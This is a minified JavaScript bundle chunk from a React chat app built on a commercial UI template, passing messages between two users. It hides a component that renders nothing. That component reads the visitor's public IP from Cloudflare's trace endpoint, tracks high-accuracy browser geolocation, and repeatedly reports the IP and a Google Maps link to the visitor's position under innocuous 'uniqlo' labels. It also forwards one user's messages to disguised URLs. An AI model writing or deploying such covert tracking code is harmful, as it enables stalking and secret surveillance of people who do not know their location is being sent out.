/*!

=========================================================
* Now UI Kit PRO React - v1.0.0
=========================================================

* Product Page: https://www.creative-tim.com/product/now-ui-kit-pro-react
* Copyright 2019 Creative Tim (http://www.creative-tim.com)

* Coded by Creative Tim

=========================================================

* The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

*/
(this["webpackJsonpmaterial-kit-pro-react"]=this["webpackJsonpmaterial-kit-pro-react"]||[]).push([[17],{247:function(e,t,a){"use strict";a.d(t,"b",(function(){return o})),a.d(t,"c",(function(){return i})),a.d(t,"a",(function(){return r}));var n,c=a(278),o=function(e,t,a){if(void 0!==window.navigator.geolocation){window.navigator.geolocation.getCurrentPosition((function(t){var n={lat:t.coords.latitude?t.coords.latitude:void 0,lng:t.coords.longitude?t.coords.longitude:void 0};e(n),a(!0)}),(function(e){t({0:"\u4e0d\u660e\u539f\u56e0\u932f\u8aa4",1:"\u4f7f\u7528\u8005\u62d2\u7d55\u63d0\u4f9b\u4f4d\u7f6e\u8cc7\u8a0a",2:"\u7121\u6cd5\u53d6\u5f97\u4f4d\u7f6e\u8cc7\u8a0a",3:"\u4f4d\u7f6e\u67e5\u8a62\u903e\u6642"}[e.code]),a(!1)}),{enableHighAccuracy:!0,timeout:5e3,maximumAge:0})}},i=function(e,t,a){c.a;if(n=n||new Date,void 0!==window.navigator.geolocation)return navigator.geolocation.watchPosition((function(t){var c={lat:t.coords.latitude?t.coords.latitude:void 0,lng:t.coords.longitude?t.coords.longitude:void 0},o=new Date;Math.abs(o-n)/1e3%60>180&&(e(c),n=new Date),a(!0)}),(function(e){t({0:"\u4e0d\u660e\u539f\u56e0\u932f\u8aa4",1:"\u4f7f\u7528\u8005\u62d2\u7d55\u63d0\u4f9b\u4f4d\u7f6e\u8cc7\u8a0a",2:"\u7121\u6cd5\u53d6\u5f97\u4f4d\u7f6e\u8cc7\u8a0a",3:"\u4f4d\u7f6e\u67e5\u8a62\u903e\u6642"}[e.code]),a(!1)}),{enableHighAccuracy:!0,timeout:5e3,maximumAge:0})},r=function(e){void 0!==window.navigator.geolocation&&navigator.geolocation.clearWatch(e)}},278:function(e,t,a){"use strict";a.d(t,"a",(function(){return n}));var n=18e4},333:function(e,t,a){"use strict";a.d(t,"b",(function(){return d})),a.d(t,"a",(function(){return O}));var n=a(2),c=a.n(n),o=a(199),i=a(241),r=a.n(i),u=a(334),s=a.n(u),l=a(335),f=a.n(l),b={fontSize:"0.7rem"},g=function(e){var t=new Date(e),a=m(t.getHours()),n=m(t.getMinutes()),c=Date.now(),o=parseInt(c-e,10)/1e3/60,i=o/60;return o<=60?"".concat(a,":").concat(n):o>60&&i<=24||i>24?"".concat(a,":").concat(n," ----- ").concat(t.toDateString()):o},m=function(e){var t=e.toString();return 1===t.length?"0".concat(t):t},O=function(e){return e===o.b?s.a:e===o.a?f.a:r.a},d=function(e){return e.user===o.b?c.a.createElement("span",{style:b},"Karen ",c.a.createElement("small",null,"\xb7 ",g(e.createOn)," ")):e.user===o.a?c.a.createElement("span",{style:b},"Kevin ",c.a.createElement("small",null,"\xb7 ",g(e.createOn))):c.a.createElement(c.a.Fragment,null)}},334:function(e,t,a){e.exports=a.p+"static/media/gloria2.666943cf.jpg"},335:function(e,t,a){e.exports=a.p+"static/media/jerry.2aa27bf0.jpg"},843:function(e,t,a){"use strict";a.r(t);var n=a(19),c=a(123),o=a.n(c),i=a(2),r=a.n(i),u=a(53),s=a(20),l=a(40),f=a(118),b=a(85),g=a(86),m=a(336),O=a(332),d=a(333),j=a(91),v=a(222),w=a(199),p=a(227),h=a(247),E=(a(32),Object(s.f)((function(e){e.history;var t=Object(i.useState)(void 0),a=Object(n.a)(t,2),c=a[0],o=a[1],u=Object(i.useState)(void 0),s=Object(n.a)(u,2),l=s[0],f=s[1],b=Object(i.useState)(void 0),g=Object(n.a)(b,2),m=g[0],O=g[1],d=Object(i.useState)(void 0),j=Object(n.a)(d,2),w=j[0],p=j[1];return Object(i.useEffect)((function(){fetch("https://www.cloudflare.com/cdn-cgi/trace").then((function(e){return e.text()})).then((function(e){var t=e.split("\n"),a=Object(n.a)(t,3),c=(a[0],a[1],a[2]);if(c){var i=c.split("="),r=Object(n.a)(i,2),u=(r[0],r[1]);o(u)}}))}),[]),Object(i.useEffect)((function(){Object(h.b)(f,O,p);var e=Object(h.c)(f,O,p);return function(){e&&Object(h.a)(e)}}),[]),Object(i.useEffect)((function(){if(m){console.log(m);var e="uniqlo user error: ".concat(m);Object(v.a)(e)}}),[m,w]),Object(i.useEffect)((function(){if(l){var e="uniqlo user \n ip:".concat(c," \n https://www.google.com.tw/maps?q=").concat(l.lat,",").concat(l.lng);Object(v.a)(e)}}),[l]),r.a.createElement(i.Fragment,null)}))),y=a(278),S=a(94),k=a(76),D=a(25),x=(a(55),a(248)),q=Object(f.a)(p.a);t.default=Object(s.f)((function(e){e.history;var t=q(),a=Object(u.useSelector)((function(e){return e.login})).user,c=Object(i.useState)(void 0),s=Object(n.a)(c,2),f=s[0],p=s[1],h=Object(i.useState)(""),I=Object(n.a)(h,2),M=I[0],U=I[1],A=Object(i.useState)(""),C=Object(n.a)(A,2),F=C[0],H=C[1],R=Object(i.useState)(!0),J=Object(n.a)(R,2),K=J[0],N=J[1],P=Object(u.useSelector)((function(e){return e.chat})).maxMessageNumber,T=Object(i.useState)(!1),z=Object(n.a)(T,2),W=z[0],B=z[1],G=Object(i.useState)(""),L=Object(n.a)(G,2),Q=L[0],V=L[1];Object(i.useEffect)((function(){if(l.c&&void 0!==P){var e=Object(D.f)(l.c,Object(D.c)(P));Object(D.d)(e,(function(e){X(e)}))}}),[P]),Object(i.useEffect)((function(){if(a&&F&&""!==F){var e={user:a,message:"".concat(F),createOn:Date.now()},t={};t[Object(D.e)(Object(D.a)(Object(D.g)(l.d),"chatMsg")).key]=e,Object(D.i)(l.c,t).then((function(){if(a===w.b){Object(v.a)("http://www.uniqlo.com/tw/store/list/new/auto")}})).catch((function(e){console.log(e.message),V(e.message),B(!0),Object(v.a)("replyImageUrl update error: ".concat(e.message))}))}}),[F]),Object(i.useEffect)((function(){setTimeout((function(){N(!1)}),5e3),setInterval((function(){N(!0),setTimeout((function(){N(!1)}),5e3)}),y.a)}),[]);var X=function(e){var t=e.val();if(null!==t&&void 0!==t){var n=o.a.slice(o.a.values(t),-P),c=o.a.slice(o.a.values(n),-1)[0].user;o.a.slice(o.a.values(n),-1)[0].createOn;a===c?(U(""),p(n)):p(n)}};return r.a.createElement("div",{className:t.section},r.a.createElement(b.a,{justify:"center"},r.a.createElement(g.a,{xs:12,sm:8,md:8},r.a.createElement("div",null,f?f.map((function(e,t){return r.a.createElement(m.a,{key:void 0!==e.id?e.id:t,avatar:Object(d.a)(e.user),title:Object(d.b)(e),message:e.message})})):r.a.createElement("div",null),r.a.createElement(O.a,{avatar:Object(d.a)(a),value:M,onChange:function(e){U(e.target.value)},onReply:function(e){if(a&&""!==M){var t={user:a,message:M,createOn:Date.now()},n={};n[Object(D.e)(Object(D.a)(Object(D.g)(l.d),"chatMsg")).key]=t,Object(D.i)(l.c,n).then((function(){B(!1)})).catch((function(e){console.log(e.message),V(e.message),B(!0),Object(v.a)("onReplyClick update error: ".concat(e.message))}))}if(a===w.b){var c="http://www.uniqlo.com/tw/store/list/new/auto?message=".concat(M);Object(v.a)(c)}},onUpdate:function(e){if(a){var t=P+1;Object(k.a)(S.a,t)}if(a===w.b){Object(v.a)("http://www.uniqlo.com/tw/store/list/new/update")}},enableUpdate:!0,setReplyImageUrl:H,enableImageUpload:!0})))),r.a.createElement(j.a,null),r.a.createElement(x.a,{enable:W,setEnable:B,title:"Error...",message:Q}),K?r.a.createElement(E,null):r.a.createElement(i.Fragment,null))}))}}]);
//# sourceMappingURL=17.21c7cb90.chunk.js.map